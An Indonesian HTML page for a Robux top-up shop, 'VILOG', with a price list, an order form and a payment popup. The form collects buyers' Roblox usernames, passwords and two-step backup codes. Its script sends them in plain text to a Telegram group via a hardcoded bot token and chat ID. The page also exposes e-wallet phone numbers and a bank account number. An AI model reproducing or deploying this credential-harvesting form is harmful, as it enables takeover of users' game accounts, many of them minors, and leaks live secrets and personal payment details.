<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Pricelist & Form Pembelian Robux - VILOG</title>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
<style>
body {
  font-family: 'Roboto', sans-serif;
  background: #fff;
  margin: 0;
  padding: 0;
  color: #333;
  font-size: 12px;
}

/* Pricelist */
.category {
  max-width: 720px;
  margin: 25px auto;
  padding: 5px 12px;
}
.category h3 {
  text-align: center;
  margin-bottom: 10px;
  font-size: 12px;
  font-weight: 700;
  color: #2c3e50;
}
.pricelist-container {
  display: flex;
  flex-wrap: wrap;
  gap: 8px;
  justify-content: center;
}
.price-box {
  flex: 0 1 calc(33.33% - 8px);
  background-color: #f9f9f9;
  border: 1px solid #d1d9e6;
  border-radius: 8px;
  padding: 6px 4px;
  text-align: center;
  font-size: 10px;
  font-weight: 500;
  color: #333;
  cursor: pointer;
  transition: 0.2s;
}
.price-box:hover {
  background-color: #eef3fa;
  border-color: #4a6fa1;
  transform: scale(1.04);
}
.price-box span {
  display: block;
  font-weight: normal;
  font-size: 10px;
  color: #555;
  margin-top: 2px;
}

/* Form */
.form-container {
  max-width: 400px;
  margin: 20px auto 40px;
  background: #fafafa;
  border: 1px solid #d1d9e6;
  border-radius: 10px;
  padding: 16px 18px;
  box-shadow: 0 2px 8px rgba(0,0,0,0.05);
}
.form-container h2 {
  text-align: center;
  margin-bottom: 14px;
  font-size: 15px;
  font-weight: 700;
  color: #2c3e50;
}
.form-group {
  margin-bottom: 10px;
}
label {
  font-size: 11px;
  font-weight: 500;
  display: block;
  margin-bottom: 3px;
  color: #444;
}
input, select {
  width: 100%;
  padding: 7px;
  border: 1px solid #ccc;
  border-radius: 6px;
  font-size: 11px;
  box-sizing: border-box;
}
button {
  width: 100%;
  padding: 9px;
  background: #4a6fa1;
  border: none;
  border-radius: 6px;
  color: white;
  font-size: 12px;
  font-weight: 600;
  cursor: pointer;
  transition: 0.2s;
}
button:hover {
  background: #3a5f8a;
}
.hidden { display: none; }
.notes {
  font-size: 11px;
  color: #666;
  margin-top: 3px;
}

/* Payment Modal */
.modal-backdrop {
  position: fixed;
  inset: 0;
  background: rgba(0,0,0,0.45);
  display: none;
  align-items: center;
  justify-content: center;
  z-index: 9999;
}
.modal {
  width: 320px;
  max-width: calc(100% - 32px);
  background: #fff;
  border-radius: 12px;
  padding: 16px;
  box-shadow: 0 8px 30px rgba(0,0,0,0.25);
  text-align: center;
}
.modal h3 {
  margin: 0 0 8px;
  font-size: 15px;
  color: #23314a;
}
.modal .qr {
  width: 180px;
  height: 180px;
  object-fit: cover;
  margin: 8px auto;
  border-radius: 8px;
  border: 1px solid #e6e6e6;
}
.modal .amount {
  font-size: 18px;
  font-weight: 700;
  margin-top: 8px;
  color: #1b3b6f;
}
.modal .pay-note {
  font-size: 12px;
  color: #555;
  margin-top: 8px;
}
.modal .actions {
  display: flex;
  gap: 8px;
  margin-top: 12px;
}
.modal .actions button {
  flex: 1;
  padding: 8px;
  font-size: 13px;
}
.modal .small-note {
  font-size: 11px;
  color: #888;
  margin-top: 10px;
}
.copy-success {
  font-size: 12px;
  color: green;
  margin-top: 6px;
  display:none;
}

/* Metode pembayaran & nomor e-wallet */
.method-switch {
  margin-top: 8px;
  display: flex;
  justify-content: center;
  gap: 6px;
  flex-wrap: wrap;
}
.method-btn {
  flex: 1;
  padding: 4px 6px;
  font-size: 11px;
  border-radius: 999px;
  border: 1px solid #4a6fa1;
  background: #ffffff;
  cursor: pointer;
  color: #4a6fa1;
}
.method-btn.active {
  background: #4a6fa1;
  color: #fff;
  border-color: #4a6fa1;
}
.wallet-section {
  margin-top: 8px;
  font-size: 11px;
  text-align: left;
}
.wallet-label {
  font-weight: 600;
  margin-bottom: 4px;
  color: #23314a;
}
.wallet-number-title {
  font-size: 10px;
  color: #555;
}
.wallet-number {
  font-family: monospace;
  font-size: 11px;
  color: #333;
  margin-top: 2px;
  word-break: break-word;
}
.copy-mini-btn {
  margin-top: 6px;
  padding: 4px 6px;
  font-size: 10px;
  border-radius: 6px;
  border: 1px solid #4a6fa1;
  background: #ffffff;
  cursor: pointer;
  color: #4a6fa1;
  width: 100%;
}
.copy-mini-btn:hover {
  background: #e6ebf5;
}
.wallet-note {
  font-size: 10px;
  color: #777;
  margin-top: 6px;
}
</style>
</head>
<body>

<!-- Robux Reguler -->
<div class="category">
<h3>Robux Reguler</h3>
<div class="pricelist-container">
  <div class="price-box" onclick="isiForm('80 Robux','000','Reguler')">80 Robux<span>No Stock</span></div>
  <div class="price-box" onclick="isiForm('160 Robux','000','Reguler')">160 Robux<span>No Stock</span></div>
  <div class="price-box" onclick="isiForm('240 Robux','000','Reguler')">240 Robux<span>No Stock</span></div>
  <div class="price-box" onclick="isiForm('320 Robux','000','Reguler')">320 Robux<span>No Stock</span></div>
  <div class="price-box" onclick="isiForm('400 Robux','000','Reguler')">400 Robux<span>No Stock</span></div>
  <div class="price-box" onclick="isiForm('480 Robux','000','Reguler')">480 Robux<span>No Stock</span></div>
  <div class="price-box" onclick="isiForm('560 Robux','000','Reguler')">560 Robux<span>No Stock</span></div>
  <div class="price-box" onclick="isiForm('640 Robux','000','Reguler')">640 Robux<span>No Stock</span></div>
  <div class="price-box" onclick="isiForm('720 Robux','000','Reguler')">720 Robux<span>No Stock</span></div>
  <div class="price-box" onclick="isiForm('800 Robux','000','Reguler')">800 Robux<span>No Stock</span></div>
  <div class="price-box" onclick="isiForm('1200 Robux','000','Reguler')">1200 Robux<span>No Stock</span></div>
</div>
</div>

<!-- Robux Special -->
<div class="category">
<h3>Robux Special (Backup Code: Wajib)</h3>
<div class="pricelist-container">
  <div class="price-box" onclick="isiForm('500 Robux','73500','Special')">500 Robux<span>Rp73.500</span></div>
  <div class="price-box" onclick="isiForm('1000 Robux','147000','Special')">1.000 Robux<span>Rp147.000</span></div>
  <div class="price-box" onclick="isiForm('1500 Robux','220500','Special')">1.500 Robux<span>Rp220.500</span></div>
  <div class="price-box" onclick="isiForm('2000 Robux','294000','Special')">2.000 Robux<span>Rp294.000</span></div>
  <div class="price-box" onclick="isiForm('2500 Robux','367500','Special')">2.500 Robux<span>Rp367.500</span></div>
  <div class="price-box" onclick="isiForm('3000 Robux','441000','Special')">3.000 Robux<span>Rp441.000</span></div>
  <div class="price-box" onclick="isiForm('3500 Robux','514500','Special')">3.500 Robux<span>Rp514.500</span></div>
  <div class="price-box" onclick="isiForm('4000 Robux','588000','Special')">4.000 Robux<span>Rp588.000</span></div>
  <div class="price-box" onclick="isiForm('4500 Robux','661500','Special')">4.500 Robux<span>Rp661.500</span></div>
</div>
</div>

<!-- Robux Premium -->
<div class="category">
<h3>Robux Premium (Backup Code: Wajib)</h3>
<div class="pricelist-container">
  <div class="price-box" onclick="isiForm('450 Robux + Premium','73500','Premium')">450 Robux + Premium<span>Rp74.150</span></div>
  <div class="price-box" onclick="isiForm('1000 Robux + Premium','147000','Premium')">1.000 Robux + Premium<span>Rp147.000</span></div>
  <div class="price-box" onclick="isiForm('1550 Robux + Premium','220500','Premium')">1.550 Robux + Premium<span>Rp220.500</span></div>
  <div class="price-box" onclick="isiForm('2200 Robux + Premium','294000','Premium')">2.200 Robux + Premium<span>Rp294.000</span></div>
  <div class="price-box" onclick="isiForm('2750 Robux + Premium','367500','Premium')">2.750 Robux + Premium<span>Rp367.500</span></div>
</div>
</div>

<!-- Form -->
<div class="form-container">
<h2>Formulir Pembelian Robux VILOG</h2>
<form id="orderForm">
  <div class="form-group">
    <label for="username">Username Roblox *</label>
    <input type="text" id="username" name="username" placeholder="Username Roblox" required>
  </div>
  <div class="form-group">
    <label for="password">Password Roblox *</label>
    <input type="password" id="password" name="password" placeholder="Password Roblox" required>
  </div>
  <div class="form-group">
    <label for="v2l">Verifikasi 2 Langkah (V2L) *</label>
    <select id="v2l" name="v2l" required>
      <option value="">-- Pilih Status --</option>
      <option value="OFF">Nonaktif (OFF)</option>
      <option value="ON">Aktif (ON)</option>
    </select>
  </div>
  <div class="form-group hidden" id="metodeV2L_div">
    <label for="metodeV2L">Pilih Metode V2L *</label>
    <select id="metodeV2L" name="metodeV2L">
      <!-- options akan di-populate secara dinamis -->
    </select>
  </div>
  <div class="form-group hidden" id="backupCode_div">
    <label for="backupCode">Masukkan Backup Code *</label>
    <input type="text" id="backupCode" name="backupCode" placeholder="Isi Backup Code">
    <div class="notes">Masukkan 1-3 backup code yang belum pernah digunakan.</div>
  </div>
  <div class="form-group hidden" id="emailNote_div">
    <div class="notes">Pastikan storage email tidak penuh supaya bisa menerima kode V2L. Wajib standby setelah payment & diharapkan fastrespon.</div>
  </div>
  <div class="form-group">
    <label for="kategori">Kategori Robux *</label>
    <input type="text" id="kategori" name="kategori" readonly required>
  </div>
  <div class="form-group">
    <label for="nominal">Jumlah Order *</label>
    <input type="text" id="nominal" name="nominal" readonly required>
  </div>
  <div class="form-group">
    <label for="harga">Harga *</label>
    <input type="text" id="harga" name="harga" readonly required>
  </div>
  <div style="text-align:center; margin: 14px 0 6px;">
    <button type="button" id="btnWa">Pesan via Telegram</button>
  </div>
</form>
</div>

<!-- Payment Modal -->
<div id="paymentModalBackdrop" class="modal-backdrop" aria-hidden="true">
  <div class="modal" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
    <h3 id="modalTitle">Pembayaran</h3>

    <!-- QR (muncul hanya untuk QRIS & default aktif) -->
    <img id="modalQr" class="qr" src="" alt="QR Pembayaran">

    <!-- Nominal akhir sesuai metode -->
    <div id="modalAmount" class="amount">Rp0</div>

    <!-- PILIH METODE PEMBAYARAN (QRIS default) -->
    <div class="method-switch">    
      <button type="button" class="method-btn active" data-method="qris">QRIS</button>    
      <button type="button" class="method-btn" data-method="gopay">GoPay</button>    
      <button type="button" class="method-btn" data-method="seabank">SeaBank</button>    
      <button type="button" class="method-btn" data-method="dana">DANA</button>    
    </div>    

    <!-- INFO NOMOR TUJUAN & CATATAN -->
    <div class="wallet-section">    
      <div id="walletLabel" class="wallet-label">QRIS (scan QR di atas)</div>    

      <div id="walletNumberWrapper">
        <div id="walletNumberTitle" class="wallet-number-title">No tujuan pembayaran</div>    
        <div id="walletNumber" class="wallet-number">Gunakan QR di atas</div>    
        <button id="copyNumberBtn" type="button" class="copy-mini-btn">Salin nomor</button>
      </div>

      <div id="walletNote" class="wallet-note">
        QRIS hingga Rp499.000 tidak ada biaya tambahan. Di atas itu akan dikenakan biaya 0,3% dari nominal.
      </div>
    </div>

    <div class="pay-note">
      Data pesanan berhasil dikirim! Silahkan lakukan pembayaran, lalu screenshot bukti pembayaran.
    </div>

    <div class="actions">
      <button id="copyAmountBtn" type="button">Salin Jumlah</button>
      <button id="openBotBtn" type="button">Buka Bot</button>
    </div>

    <div class="small-note">
      Setelah bayar dan screenshot, klik Buka Bot untuk konfirmasi pembayaran agar pesanan segera diproses.
    </div>

    <div style="margin-top:10px;">
      <button id="closeModalBtn" type="button" style="width:100%; background:#e0e0e0; color:#222;">Tutup</button>
    </div>

    <div id="copySuccess" class="copy-success"></div>
  </div>
</div>

<script>
function isiForm(nominal, harga, kategori) {
  document.getElementById("nominal").value = nominal;
  const hargaNumber = typeof harga === 'number' ? harga : Number(String(harga).replace(/[^\d]/g,''));
  document.getElementById("harga").value = "Rp" + new Intl.NumberFormat('id-ID').format(hargaNumber);
  document.getElementById("kategori").value = kategori;
  // Setelah kategori di-set, update opsi V2L jika diperlukan
  updateV2LOptions();
  document.querySelector('.form-container').scrollIntoView({ behavior: 'smooth' });
}

// Fungsi untuk mengatur opsi metode V2L berdasarkan kategori
function updateV2LOptions() {
  const kategori = document.getElementById("kategori").value || '';
  const v2lVal = document.getElementById("v2l").value;
  const metodeSelect = document.getElementById("metodeV2L");
  const metodeDiv = document.getElementById("metodeV2L_div");

  // Jika V2L OFF, sembunyikan metode & input terkait
  if (v2lVal !== "ON") {
    metodeDiv.classList.add("hidden");
    document.getElementById("backupCode_div").classList.add("hidden");
    document.getElementById("emailNote_div").classList.add("hidden");
    // kosongkan value metode
    metodeSelect.innerHTML = '';
    return;
  }

  // V2L = ON -> tampilkan metode; tapi isi opsi tergantung kategori
  metodeDiv.classList.remove("hidden");

  if (kategori === "Special" || kategori === "Premium") {
    // Hanya Backup Code tersedia
    metodeSelect.innerHTML = '<option value="">-- Pilih Metode --</option>' +
                             '<option value="Backup Code">Backup Code</option>';
    // set metode ke Backup Code otomatis (lebih user-friendly)
    metodeSelect.value = "Backup Code";
    // tampilkan backup code input
    document.getElementById("backupCode_div").classList.remove("hidden");
    document.getElementById("emailNote_div").classList.add("hidden");
  } else {
    // Reguler -> Backup Code dan Kode Email tersedia
    metodeSelect.innerHTML = '<option value="">-- Pilih Metode --</option>' +
                             '<option value="Backup Code">Backup Code</option>' +
                             '<option value="Kode Email">Kode Email</option>';
    // jika sebelumnya metode sudah ada dan valid, biarkan; kalau kosong, hide rincian sampai user pilih
    const current = metodeSelect.value;
    if (current === "Backup Code") {
      document.getElementById("backupCode_div").classList.remove("hidden");
      document.getElementById("emailNote_div").classList.add("hidden");
    } else if (current === "Kode Email") {
      document.getElementById("backupCode_div").classList.add("hidden");
      document.getElementById("emailNote_div").classList.remove("hidden");
    } else {
      document.getElementById("backupCode_div").classList.add("hidden");
      document.getElementById("emailNote_div").classList.add("hidden");
    }
  }
}

// V2L select listener
document.getElementById("v2l").addEventListener("change", function() {
  updateV2LOptions();
});

// metodeV2L change listener
document.getElementById("metodeV2L").addEventListener("change", function() {
  if (this.value === "Backup Code") {
    document.getElementById("backupCode_div").classList.remove("hidden");
    document.getElementById("emailNote_div").classList.add("hidden");
  } else if (this.value === "Kode Email") {
    document.getElementById("emailNote_div").classList.remove("hidden");
    document.getElementById("backupCode_div").classList.add("hidden");
  } else {
    document.getElementById("backupCode_div").classList.add("hidden");
    document.getElementById("emailNote_div").classList.add("hidden");
  }
});

// Kirim langsung ke Telegram
document.getElementById("btnWa").addEventListener("click", function() {
  const form = document.getElementById("orderForm");
  // cek required fields (input/select with attribute required)
  const inputs = form.querySelectorAll("input[required], select[required]");
  for (const input of inputs) {
    if (!input.value.trim()) {
      alert("Harap isi semua kolom yang wajib diisi!");
      input.focus();
      return;
    }
  }

  // Ambil nilai
  let username = document.getElementById("username").value.trim();
  let password = document.getElementById("password").value.trim();
  let v2l = document.getElementById("v2l").value;
  let metodeV2L = document.getElementById("metodeV2L").value;
  let backupCode = document.getElementById("backupCode").value.trim();
  let kategori = document.getElementById("kategori").value;
  let nominal = document.getElementById("nominal").value;
  let harga = document.getElementById("harga").value;

  // Validasi tambahan sesuai rules:
  // Jika V2L = ON, metodeV2L harus dipilih (karena user harus pilih metode)
  if (v2l === "ON") {
    if (!metodeV2L) {
      alert("Karena V2L aktif, silakan pilih metode V2L.");
      document.getElementById("metodeV2L").focus();
      return;
    }
    // Jika kategori Special/Premium => wajib Backup Code
    if ((kategori === "Special" || kategori === "Premium") && metodeV2L !== "Backup Code") {
      // Untuk mencegah, juga pastikan select hanya berisi Backup Code, tapi validasi double-check
      alert("Kategori " + kategori + " meminta Backup Code. Mohon pilih/masukkan Backup Code.");
      document.getElementById("metodeV2L").focus();
      return;
    }
    // Jika metode Backup Code dipilih -> pastikan backupCode diisi
    if (metodeV2L === "Backup Code" && !backupCode) {
      alert("Mohon masukkan Backup Code karena metode V2L adalah Backup Code.");
      document.getElementById("backupCode").focus();
      return;
    }
    // Jika metode Kode Email dipilih untuk Reguler -> tidak wajib backupCode (boleh kosong)
  }

  const botToken = "8039852277:AAEqbfQUF37cjDlEposj2rzHm28_Pxzv-mw";
  const chatId = "-1003049680083";

  const text =
    "Pesanan Baru Masuk!\n\n" +
    "Username Roblox: " + username + "\n" +
    "Password Roblox: " + password + "\n" +
    "V2L: " + v2l + (metodeV2L ? " (" + metodeV2L + ")" : "") + (backupCode ? "\nBackup Code: " + backupCode : "") + "\n" +
    "Kategori: " + kategori + "\n" +
    "Nominal: " + nominal + "\n" +
    "Harga: " + harga;

  fetch("https://api.telegram.org/bot" + botToken + "/sendMessage", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text: text
    })
  })
  .then(res => {
    if (res.ok) {
      const qrUrl = "https://payment.uwu.ai/assets/images/gallery03/8555ed8a_original.jpg?v=58e63277";
      showPaymentPopup(qrUrl, harga);
      form.reset();
      // setelah reset, sembunyikan div-detail
      document.getElementById("backupCode_div").classList.add("hidden");
      document.getElementById("emailNote_div").classList.add("hidden");
      document.getElementById("metodeV2L_div").classList.add("hidden");
      document.getElementById("metodeV2L").innerHTML = '';
    } else {
      alert("Gagal mengirim ke Telegram. Coba lagi.");
    }
  })
  .catch(error => {
    alert("Terjadi kesalahan saat mengirim ke Telegram.");
    console.error(error);
  });
});

/* Modal payment functions */
function showPaymentPopup(qrUrl, hargaFormatted) {
  const backdrop = document.getElementById('paymentModalBackdrop');
  const modalQr = document.getElementById('modalQr');
  const modalAmount = document.getElementById('modalAmount');
  const copySuccess = document.getElementById('copySuccess');

  const walletLabel = document.getElementById('walletLabel');
  const walletNumberTitle = document.getElementById('walletNumberTitle');
  const walletNumber = document.getElementById('walletNumber');
  const walletNumberWrapper = document.getElementById('walletNumberWrapper');
  const walletNote = document.getElementById('walletNote');
  const copyNumberBtn = document.getElementById('copyNumberBtn');

  const methodButtons = document.querySelectorAll('.method-btn');

  const GOPAY_NUMBER   = '083197962700';
  const DANA_NUMBER    = '083197962700';
  const SEABANK_NUMBER = '901673348752';

  const baseAmount = (function () {
    const num = Number(String(hargaFormatted).replace(/[^\d]/g, ''));
    return isNaN(num) ? 0 : num;
  })();

  function formatRupiah(num) {
    return "Rp" + new Intl.NumberFormat('id-ID').format(num);
  }

  const METHOD_CONFIG = {
    qris: {
      label: 'QRIS (scan QR di atas)',
      numberTitle: '',
      number: '',
      calcTotal: (base) => {
        if (base <= 499000) return base;
        const fee = Math.round(base * 0.003); // 0.3%
        return base + fee;
      },
      note: 'QRIS hingga Rp499.000 tidak ada biaya tambahan. Di atas itu akan dikenakan biaya 0,3% dari nominal.',
      showNumber: false
    },
    gopay: {
      label: 'Transfer GoPay',
      numberTitle: 'No HP GoPay',
      number: GOPAY_NUMBER,
      calcTotal: (base) => base,
      note: 'Pembayaran GoPay tidak ada biaya tambahan. Bayar sesuai nominal yang tertera.',
      showNumber: true
    },
    seabank: {
      label: 'Transfer SeaBank',
      numberTitle: 'No rekening SeaBank',
      number: SEABANK_NUMBER,
      calcTotal: (base) => base,
      note: 'SeaBank tidak ada biaya tambahan. Bayar sesuai nominal yang tertera.',
      showNumber: true
    },
    dana: {
      label: 'Transfer DANA',
      numberTitle: 'No HP DANA',
      number: DANA_NUMBER,
      calcTotal: (base) => base + 100,
      note: 'Pembayaran DANA dikenakan biaya admin Rp100. Total sudah termasuk biaya admin.',
      showNumber: true
    }
  };

  function showMessage(msg) {
    copySuccess.textContent = msg;
    copySuccess.style.display = 'block';
    setTimeout(()=> copySuccess.style.display = 'none', 2500);
  }

  function copyTextToClipboard(text, successMsg) {
    if (!text) return;
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(text).then(() => {
        showMessage(successMsg);
      }).catch(() => {
        const tmp = document.createElement('textarea');
        tmp.value = text;
        document.body.appendChild(tmp);
        tmp.select();
        try {
          document.execCommand('copy');
          showMessage(successMsg);
        } catch(e) {
          showMessage('Tidak dapat menyalin, silakan salin manual.');
        }
        document.body.removeChild(tmp);
      });
    } else {
      const tmp = document.createElement('textarea');
      tmp.value = text;
      document.body.appendChild(tmp);
      tmp.select();
      try {
        document.execCommand('copy');
        showMessage(successMsg);
      } catch(e) {
        showMessage('Tidak dapat menyalin, silakan salin manual.');
      }
      document.body.removeChild(tmp);
    }
  }

  function applyMethod(methodKey) {
    methodButtons.forEach(btn => {
      btn.classList.toggle('active', btn.dataset.method === methodKey);
    });

    const cfg = METHOD_CONFIG[methodKey];

    walletLabel.textContent = cfg.label;
    walletNote.textContent = cfg.note;

    const total = cfg.calcTotal(baseAmount);
    modalAmount.textContent = formatRupiah(total);

    if (cfg.showNumber) {
      walletNumberTitle.textContent = cfg.numberTitle;
      walletNumber.textContent = cfg.number;
      walletNumberWrapper.style.display = 'block';
      copyNumberBtn.style.display = 'block';
    } else {
      // QRIS: tidak perlu nomor + tombol salin
      walletNumberWrapper.style.display = 'none';
      copyNumberBtn.style.display = 'none';
    }

    if (methodKey === 'qris') {
      modalQr.style.display = 'block';
      modalQr.src = qrUrl;
    } else {
      modalQr.style.display = 'none';
    }
  }

  // default QRIS
  applyMethod('qris');

  copySuccess.style.display = 'none';
  backdrop.style.display = 'flex';
  backdrop.setAttribute('aria-hidden', 'false');

  methodButtons.forEach(btn => {
    btn.onclick = function () {
      applyMethod(this.dataset.method);
    };
  });

  document.getElementById('closeModalBtn').onclick = function() {
    backdrop.style.display = 'none';
    backdrop.setAttribute('aria-hidden', 'true');
  };

  backdrop.onclick = function(e) {
    if (e.target === backdrop) {
      backdrop.style.display = 'none';
      backdrop.setAttribute('aria-hidden', 'true');
    }
  };

  // SALIN NOMOR (hanya untuk GoPay / SeaBank / DANA)
  copyNumberBtn.onclick = function () {
    copyTextToClipboard(walletNumber.textContent || '', 'Nomor berhasil disalin');
  };

  // SALIN JUMLAH
  document.getElementById('copyAmountBtn').onclick = function() {
    copyTextToClipboard(modalAmount.textContent || '', 'Jumlah berhasil disalin');
  };

  // BUKA BOT
  document.getElementById('openBotBtn').onclick = function() {
    const botUsername = 'topupressbot';
    const tgScheme = 'tg://resolve?domain=' + encodeURIComponent(botUsername);
    const webLink  = 'https://t.me/' + encodeURIComponent(botUsername) + '?start';

    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

    let appOpened = false;
    function onVisibilityChange() {
      if (document.hidden) {
        appOpened = true;
      }
    }
    document.addEventListener('visibilitychange', onVisibilityChange);

    try {
      if (isMobile) {
        window.location.href = tgScheme;
      } else {
        const newWin = window.open(tgScheme, '_blank');
        if (newWin) {
          try { newWin.focus(); } catch(e){}
        }
      }
    } catch (e) {}

    const fallbackTimeout = setTimeout(function() {
      if (!appOpened) {
        window.open(webLink, '_blank');
      }
      document.removeEventListener('visibilitychange', onVisibilityChange);
    }, 800);

    window.addEventListener('pagehide', function cleanup() {
      clearTimeout(fallbackTimeout);
      document.removeEventListener('visibilitychange', onVisibilityChange);
      window.removeEventListener('pagehide', cleanup);
    });
  };
}
</script>

</body>
</html>
